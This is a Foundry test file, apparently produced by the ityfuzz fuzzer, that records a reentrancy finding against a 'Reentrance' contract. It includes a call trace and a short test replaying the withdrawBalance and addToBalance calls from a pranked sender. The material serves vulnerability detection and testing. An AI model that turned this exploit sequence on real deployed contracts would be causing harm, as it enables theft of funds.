// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -t './build/*' -f
/*

😊😊 Found violations!


================ Description ================
[Reentrancy]: Reentrancy on "build/Reentrance(0x887db5715868498cff494b5dcc8eda6ce5b7652a)" at slot 276416896359542683946398823401879949021604486037763510887513125271436631789
================ Trace ================
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   ├─[1] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.withdrawBalance()
   │  ├─[2] [Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510.fallback()
   │  │  ├─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.addToBalance{value: 147.5750 ether}()
   │  │  └─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call(0x00000000)


 */

contract Build is Test {
    function setUp() public {
    }

    function test() public {
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).withdrawBalance();
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).addToBalance{value: 147.5750 ether}();
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function withdrawBalance() external payable;
    function addToBalance() external payable;
}
